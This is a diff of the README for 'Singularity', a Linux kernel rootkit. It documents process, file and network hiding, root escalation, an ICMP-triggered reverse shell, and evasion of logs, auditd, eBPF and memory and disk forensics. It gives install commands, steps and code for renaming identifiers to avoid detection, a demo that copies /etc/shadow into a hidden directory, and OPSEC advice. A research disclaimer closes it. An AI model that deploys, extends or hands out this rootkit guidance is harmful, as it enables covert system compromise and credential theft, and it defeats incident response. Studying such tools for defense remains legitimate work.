@@ -18,13 +18,17 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 
 - **Process Hiding**: Make any process completely invisible to the system
 - **File & Directory Hiding**: Conceal files using pattern matching
-- **Network Stealth**: Hide TCP/UDP connections and ports
+- **Network Stealth**: Hide TCP connections and ports
 - **Privilege Escalation**: Multiple methods to gain instant root access
 - **Log Sanitization**: Filter kernel logs and system journals in real-time
 - **Self-Hiding**: Remove itself from module lists and system monitoring
 - **Remote Access**: ICMP-triggered reverse shell with automatic hiding
 - **Anti-Detection**: Block eBPF tools, io_uring operations, and prevent module loading
 - **Audit Evasion**: Drop audit messages for hidden processes at netlink level
+- **Memory Forensics Evasion**: Filter /proc/kcore, /proc/kallsyms, /proc/vmallocinfo
+- **Cgroup Filtering**: Filter hidden PIDs from cgroup.procs
+- **Syslog Evasion**: Hook do_syslog to filter klogctl() kernel ring buffer access
+- **Debugfs Evasion**: Filter output of tools that read raw block devices
 
 ---
 
@@ -34,7 +38,7 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 - Complete process hiding from /proc and monitoring tools
 - Pattern-based filesystem hiding for files and directories
 - Network connection concealment from netstat, ss, and packet analyzers
-- Real-time kernel log filtering for dmesg and journalctl
+- Real-time kernel log filtering for dmesg, journalctl, and klogctl
 - Module self-hiding from lsmod and /sys/module
 - Automatic kernel taint flag normalization
 - BPF syscall interception to prevent eBPF-based detection
@@ -47,6 +51,12 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 - Network packet-level filtering with raw socket protection
 - Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)
 - Netlink-level audit message filtering to evade auditd detection
+- Cgroup PID filtering to prevent detection via `/sys/fs/cgroup/*/cgroup.procs`
+- TaskStats netlink blocking to prevent PID enumeration
+- /proc/kcore filtering to evade memory forensics tools (Volatility, crash, gdb)
+- do_syslog hook to filter klogctl() and prevent kernel ring buffer leaks
+- Block device output filtering to evade debugfs and similar disk forensics tools
+- journalctl -k output filtering via write hook
 
 ---
 
@@ -59,21 +69,20 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 - GCC and Make
 - Root access
 
-### Quick Start
+### Quick Install
 ```bash
-cd /dev/shm
 git clone https://github.com/MatheuZSecurity/Singularity
 cd Singularity
-
-# IMPORTANT: Configure your IP before compiling
-# Edit include/core.h and modules/icmp.c
-
 make
 sudo insmod singularity.ko
-sudo bash scripts/journal.sh
 sudo bash scripts/x.sh
-cd ..
 ```
+
+That's it. The module automatically:
+- Hides itself from lsmod, /proc/modules, /sys/module
+- Clears kernel taint flags
+- Filters sensitive strings from dmesg, journalctl -k, klogctl
+- Starts protecting your hidden files and processes
 
 ### Important Notes
 
@@ -136,6 +145,109 @@ if (strstr(envs, "MAGIC=mtz")) {  // Change "mtz" to your string
 **Edit `modules/icmp.c`:**
 ```c
 #define ICMP_MAGIC_SEQ 1337  // Change to your sequence
+```
+
+---
+
+## CRITICAL: Randomize Your Hidden Names
+
+**Default names like "singularity" are easily detected.** For more stealth, you MUST randomize all identifiers before compiling.
+
+### Step 1: Generate Random Names
+
+```bash
+# Generate random hidden names
+echo ".$(head -c 16 /dev/urandom | md5sum | head -c 10)"
+# Example output: .7f2a9b1c8d
+
+echo ".$(head -c 16 /dev/urandom | md5sum | head -c 10)"  
+# Example output: .e5bb0ff518
+```
+
+### Step 2: Update hiding_directory_def.h
+
+**Edit `include/hiding_directory_def.h`:**
+```c
+static const char *hidden_patterns[] = {
+    ".7f2a9b1c8d",    // Your first random name
+    ".e5bb0ff518",    // Your second random name
+    NULL  
+};
+```
+
+### Step 3: Update Log Filter
+
+**Edit `modules/clear_taint_dmesg.c` - find and update `line_contains_sensitive_info()`:**
+```c
+notrace static bool line_contains_sensitive_info(const char *line) {
+    if (!line)
+        return false;
+    return (strstr(line, "taint") != NULL || 
+            strstr(line, "journal") != NULL ||
+            strstr(line, ".7f2a9b1c8d") != NULL ||    // Your first random name
+            strstr(line, ".e5bb0ff518") != NULL ||    // Your second random name
+            strstr(line, "hook") != NULL || 
+            strstr(line, "hooked_") != NULL ||
+            strstr(line, "constprop") != NULL ||
+            strstr(line, "kallsyms_lookup_name") != NULL ||
+            strstr(line, "clear_taint") != NULL || 
+            strstr(line, "__builtin__ftrace") != NULL ||
+            strstr(line, "filter_kmsg") != NULL || 
+            strstr(line, "create_trampoline+") != NULL ||
+            strstr(line, "fh_install") != NULL || 
+            strstr(line, "fh_remove") != NULL ||
+            strstr(line, "ftrace_helper") != NULL);
+}
+```
+
+### Step 4: Update Disk Forensics Filter
+
+**Edit `modules/hooks_write.c` - find and update `buffer_has_singularity()` and `sanitize_fs_tool_buffer_inplace()`:**
+```c
+static notrace bool buffer_has_singularity(const char *buf, size_t len)
+{
+    if (!buf || len == 0)
+        return false;
+    return memmem_ci(buf, len, ".7f2a9b1c8d", 11) != NULL;  // Your pattern
+}
+
+static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
+{
+    const size_t pattern_len = 11;  // Length of your pattern
+    // ... update the pattern in memmem_ci call
+    found = memmem_ci(ptr, remaining, ".7f2a9b1c8d", pattern_len);  // Your pattern
+    // ...
+}
+```
+
+### Step 5: Update Other Identifiers
+
+**Edit `modules/icmp.c`:**
+```c
+#define PROC_NAME "kworker/0:1"  // Looks like a kernel worker or other name
+#define ICMP_MAGIC_SEQ 48291     // Random sequence number
+```
+
+### Step 6: Compile and Deploy
+
+```bash
+make clean && make
+sudo insmod singularity.ko
+```
+
+### Step 7: Create Hidden Workspace
+
+```bash
+# Create your hidden directory
+cd /run
+mkdir -p .7f2a9b1c8d
+cp /etc/shadow .7f2a9b1c8d/shadow
+cat .7f2a9b1c8d/shadow
+
+# Your files are now:
+# ✓ Hidden from ls, find, stat (VFS hooks)
+# ✓ Hidden from debugfs (write hook filters output)
+# ✓ Filtered from dmesg, journalctl -k (log sanitization)
 ```
 
 ---
@@ -265,14 +377,42 @@ Protection against io_uring bypass in ftrace_enabled and tracing_on attempts wit
 
 ### Log Sanitization
 
-Real-time filtering of sensitive strings from kernel and system logs:
-- /proc/kmsg
-- /sys/kernel/debug/tracing/*
-- /var/log/kern.log, syslog, auth.log
-- /proc/vmallocinfo, /proc/kallsyms, /proc/kcore
-- Scheduler debug output (sched_debug_show)
+Real-time filtering of sensitive strings from all kernel log interfaces:
 
-Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate
+| Interface | Hook | Status |
+|-----------|------|--------|
+| `dmesg` | read hook on /proc/kmsg | ✅ Filtered |
+| `journalctl -k` | write hook (output filtering) | ✅ Filtered |
+| `klogctl()` / `syslog()` | do_syslog hook | ✅ Filtered |
+| `/sys/kernel/debug/tracing/*` | read hook | ✅ Filtered |
+| `/var/log/kern.log`, `syslog`, `auth.log` | read hook | ✅ Filtered |
+| `/proc/kallsyms`, `/proc/kcore`, `/proc/vmallocinfo` | read hook | ✅ Filtered |
+
+Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate, hook, hooked_, constprop, clear_taint, ftrace_helper, fh_install, fh_remove
+
+### Disk Forensics Evasion
+
+Singularity hooks the write syscall to detect and filter output from disk forensics tools:
+
+**How it works:**
+1. Detects if process has a block device open (`/dev/sda`, `/dev/nvme0n1`, etc)
+2. Detects debugfs-style output patterns (inode listings, filesystem metadata)
+3. Sanitizes hidden patterns in-place (replaces with spaces to maintain buffer size/checksums)
+
+```bash
+# Hidden files are invisible even to raw disk analysis
+debugfs /dev/sda3 -R 'ls -l /home/user/singularity'
+#            (spaces where "singularity" was)
+
+# The pattern is sanitized in the output buffer
+# Checksums remain valid, no corruption
+```
+
+**Detected patterns:**
+- `debugfs:` prefix
+- Inode listings with parentheses
+- `Inode count:`, `Block count:`, `Filesystem volume name:`
+- `Filesystem UUID:`, `e2fsck`, `Inode:`
 
 ### Process Hiding Implementation
 
@@ -285,6 +425,9 @@ Complete hiding from syscalls and kernel interfaces:
 - sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval (returns ESRCH)
 - getpriority (returns ESRCH)
 - sysinfo (process count adjusted)
+- pidfd_open (returns ESRCH)
+- TaskStats netlink queries (returns ESRCH)
+- Cgroup PIDs filtered from cgroup.procs
 
 Child processes automatically tracked via sched_process_fork tracepoint hook.
 
@@ -294,11 +437,15 @@ Child processes automatically tracked via sched_process_fork tracepoint hook.
 
 **Process Monitoring**: ps, top, htop, etc
 
-**Filesystem**: ls, find, locate, stat, lstat, readlink, debugfs (when using /dev/shm)
+**Filesystem**: ls, find, locate, stat, lstat, readlink
+
+**Disk Forensics**: debugfs, e2fsck (output filtered via write hook)
+
+**Memory Forensics**: Volatility, crash, gdb (via /proc/kcore filtering)
 
 **Network**: netstat, ss, lsof, tcpdump, wireshark, /proc/net/*
 
-**Logs & Traces**: dmesg, journalctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf
+**Logs & Traces**: dmesg, journalctl -k, klogctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf
 
 **Rootkit Detectors**: unhide, chkrootkit, rkhunter
 
@@ -310,12 +457,27 @@ Child processes automatically tracked via sched_process_fork tracepoint hook.
 
 ## Evasion Techniques
 
-### Use tmpfs for Operations
+### Use tmpfs for more Stealth
 ```bash
-cd /dev/shm
-mkdir singularity
-# Work here - invisible to debugfs disk analysis
+cd /dev/shm   # or /run
+mkdir .hidden
+# Work here - extra layer of protection
 ```
+
+### Why tmpfs (/run, /dev/shm)?
+
+While Singularity can hide files anywhere in the filesystem (even from debugfs), using tmpfs provides an **extra layer of protection**:
+
+| Protection Layer | Regular Filesystem | tmpfs |
+|-----------------|-------------------|-------|
+| VFS hooks (ls, find, stat) | ✅ Hidden | ✅ Hidden |
+| debugfs output filtering | ✅ Hidden | ✅ Hidden |
+| Survives reboot | ✅ Yes | ❌ No (auto-cleanup) |
+| Raw block device reads* | ⚠️ Possible | ❌ Nothing on disk |
+
+*Some advanced tools may read disk blocks directly without going through the kernel's write path. Using tmpfs eliminates this attack vector entirely since files only exist in RAM.
+
+**Recommendation**: Use tmpfs (`/run`, `/dev/shm`) for maximum stealth. Your files will be hidden by VFS hooks, filtered from debugfs output, AND have no disk footprint at all.
 
 ### Secure File Deletion
 ```bash
@@ -323,37 +485,16 @@ shred -vfz -n 10 sensitive_file
 rm -f sensitive_file
 ```
 
-### Customize All Indicators
-
-Change all default values to avoid signature-based detection:
-
-**Patterns:**
-```c
-static const char *hidden_patterns[] = {
-    "random_xyz_unique_string",
-    NULL
-};
-```
-
-**Other customizations:**
-- Magic word: `MAGIC=your_unique_string`
-- ICMP sequence: `#define ICMP_MAGIC_SEQ 31337`
-- Port: `#define PORT 54321`
-- Thread name: `#define RESET_THREAD_NAME "systemd_worker"`
-- Process name: `#define PROC_NAME "kworker/0:1"`
-
 ### Persistence (Use it if you want, but be aware of the risk)
 
-Don't use `load_and_persistence.sh` for stealth operations - module becomes visible in filesystem and can be detected by debugfs disk analysis. Load manually each session: `sudo insmod singularity.ko`
+Don't use `load_and_persistence.sh` for stealth operations - module becomes visible in filesystem. Load manually each session: `sudo insmod singularity.ko`
 
 ### More OPSEC
 
-1. Always work in /dev/shm (tmpfs)
+1. Use tmpfs (/dev/shm, /run) for extra protection
 2. Use unique, random names for everything
-3. Clean journal logs after operations: `sudo bash scripts/journal.sh` (can be detected via audit logs, so be careful, this will be resolved in future updates to Singularity)
-4. Remove all traces: `sudo bash scripts/x.sh`
-5. Customize all default strings before compilation
-6. Use non-standard ports and sequences
+3. Customize all default strings before compilation
+4. Use non-standard ports and sequences
 
 ---
 
@@ -363,24 +504,32 @@ Don't use `load_and_persistence.sh` for stealth operations - module becomes visi
 |---------|--------|---------|
 | getdents, getdents64 | hiding_directory.c | Filter directory entries, hide PIDs |
 | stat, lstat, newstat, newlstat, statx, newfstatat | hiding_stat.c | Hide file metadata, adjust nlink |
+| getpriority | hiding_stat.c | Hide priority queries for hidden PIDs |
 | openat | open.c | Block access to hidden /proc/[pid] |
 | readlinkat | hiding_readlink.c | Block symlink resolution |
 | chdir | hiding_chdir.c | Prevent cd into hidden dirs |
-| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs |
-| sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug |
-| write, writev, pwrite64, pwritev, sendfile, sendfile64, copy_file_range, splice, vmsplice, tee | hooks_write.c | Block ftrace/tracing control |
-| io_uring_enter | hooks_write.c | Block async I/O bypass |
+| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs, kcore, kallsyms, cgroup PIDs |
+| do_syslog | clear_taint_dmesg.c | Filter klogctl()/syslog() kernel ring buffer |
+| sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug output |
+| write, writev, pwrite64, pwritev, pwritev2 | hooks_write.c | Block ftrace control + filter disk forensics + filter journalctl output |
+| sendfile, sendfile64, copy_file_range | hooks_write.c | Block file copies to protected files |
+| splice, vmsplice, tee | hooks_write.c | Block pipe-based writes to protected files |
+| io_uring_enter | hooks_write.c | Block async I/O bypass with PID caching |
 | kill, getuid | become_root.c | Root trigger + magic env detection |
-| getsid, getpgid, getpgrp, sched_*, sysinfo | become_root.c | Hide PID queries |
-| getpriority | hiding_stat.c | Hide priority queries |
-| tcp4_seq_show, tcp6_seq_show, tpacket_rcv | hiding_tcp.c | Hide network connections |
-| bpf | bpf_hook.c | Block eBPF tools |
+| getsid, getpgid, getpgrp | become_root.c | Returns ESRCH for hidden PIDs |
+| sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval | become_root.c | Returns ESRCH for hidden PIDs |
+| sysinfo | become_root.c | Adjusts process count |
+| pidfd_open | become_root.c | Returns ESRCH for hidden PIDs |
+| tcp4_seq_show, tcp6_seq_show | hiding_tcp.c | Hide TCP connections from /proc/net |
+| tpacket_rcv | hiding_tcp.c | Drop packets at raw socket level |
+| bpf | bpf_hook.c | Block eBPF tracing operations |
 | init_module, finit_module | hooking_insmod.c | Prevent module loading |
 | icmp_rcv | icmp.c | ICMP-triggered reverse shell |
-| module_hide_current | hide_module.c | Remove from lists/sysfs |
+| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |
+| taskstats_user_cmd | task.c | Block TaskStats queries for hidden PIDs |
 | sched_process_fork (tracepoint) | trace.c | Track child processes |
 | tainted_mask (kthread) | reset_tainted.c | Clear kernel taint flags |
-| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |
+| module_hide_current | hide_module.c | Remove from module lists and sysfs |
 
 **Multi-Architecture Support**: x86_64 (`__x64_sys_*`) and ia32 (`__ia32_sys_*`, `__ia32_compat_sys_*`)
 
@@ -388,7 +537,7 @@ Don't use `load_and_persistence.sh` for stealth operations - module becomes visi
 
 ## Compatibility
 
-**Tested on**: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅
+**Tested on**: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅ | Kernel 6.17.8-300.fc43 ✅
 
 **Architecture**: x86_64 (primary) | ia32 (full support)
 
@@ -443,18 +592,18 @@ I won't patch for this, because it will be much more OP ;)
 
 ---
 
-## Disclaimer
-
 **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
 
-This rootkit is provided solely for educational purposes and learning.
+Singularity was created as a research project to explore the limits of kernel-level stealth techniques. The goal is to answer one question: **"How far can a rootkit hide if it manages to infiltrate and load into a system?"**
 
-Use responsibly. Test only on systems you own or have explicit permission to test.
+This project exists to:
+- Push the boundaries of offensive security research
+- Help defenders understand what they're up against
+- Provide a learning resource for kernel internals and evasion techniques
+- Contribute to the security community's knowledge base
 
----
+**I am not responsible for any misuse of this software.** If you choose to use Singularity for malicious purposes, that's on you. This tool is provided as-is for research, education, and authorized security testing only.
 
-## Hi
+Test only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal in most jurisdictions.
 
-**Created by MatheuZSecurity**
-
-> "More love and less war"
+**Be a researcher, not a criminal.**
